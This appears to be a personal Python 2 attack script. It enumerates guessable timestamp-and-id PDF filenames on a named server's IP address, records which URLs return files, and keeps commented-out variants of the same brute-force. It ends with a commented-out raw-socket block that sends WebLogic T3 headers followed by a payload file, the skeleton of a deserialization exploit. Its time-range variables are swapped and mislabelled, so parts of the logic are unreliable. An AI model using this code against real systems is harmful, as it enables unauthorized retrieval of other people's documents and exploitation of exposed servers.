#coding:utf-8
#!/usr/bin/python
#早上十点到20160121104738_733,pdf号码减少
import requests
import time,sys

target_example='''
http://211.103.228.187/lms/attached/annexNotice/20160121/20160121104738_733.pdf
http://211.103.228.187/lms/attached/annexNotice/20160121/20160121115644_827.pdf
http://211.103.228.187/lms/attached/annexNotice/20160121/20160121130022_918.pdf
'''

def check():
    time_start=20160121115644
    time_start_float=time.mktime((2016, 1, 21, 10, 00, 00, 3, 21, 0))
    id_start=732
    id_end=990
    time_end=20160121140000
    time_end_float=time.mktime((2016, 1, 21, 10, 47, 38, 3, 21, 0))

    while(time_start_float<=time_end_float):
        #累加时间秒，测试id号，知道时间值等于结束时间值

        test_time=time.strftime('%Y%m%d%H%M%S',time.localtime(time_end_float))
        target='http://211.103.228.187/lms/attached/annexNotice/20160121/%s_%s.pdf'%(test_time,id_start)
        result=requests.get(url=target).content
        if result.find('showError')==-1:
            print 'success:%s'%target
            print "\n\r"
            print "\n\r"
            id_start-=1
            with open('success.txt','a+') as hand:
                hand.writelines('success:%s'%target)
        else:
            print 'fail:%s'%target
            with open('fail.txt','a+') as handfail:
                handfail.writelines('fail:%s'%target)
        time_end_float=time_end_float-1

if __name__ == '__main__':
    check()





# from multiprocessing.dummy import Pool as threadPool
# example='http://211.103.228.187/lms/attached/annexNotice/20160121/20160121115644_827.pdf'
# target1='http://211.103.228.187/lms/attached/annexNotice/20160121/20160121115644_'
# #返回目标列表
# def gettimelist():
#     for x in range()
# print time.time()
# def getList():
#     for x in range(1,2000):
#         target="http://211.103.228.187/lms/attached/annexNotice/20160121/20160121115644_%s.pdf"%(x)
#         result=requests.get(url=target).content
#         if result.find('showError')==1:
#             print target


# if __name__ == '__main__':






# import socket
# import sys
#
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
# server_address = (sys.argv[1], int(sys.argv[2]))
# print 'connecting to %s port %s' % server_address
# sock.connect(server_address)
#
# # Send headers
# headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
# print 'sending "%s"' % headers
# sock.sendall(headers)
#
# data = sock.recv(1024)
# print >>sys.stderr, 'received "%s"' % data
#
# payloadObj = open(sys.argv[3],'rb').read()
#
#
# payload=''
# print 'sending payload...'
# '''outf = open('payload.tmp','w')
# outf.write(payload)
# outf.close()'''
# sock.send(payload)
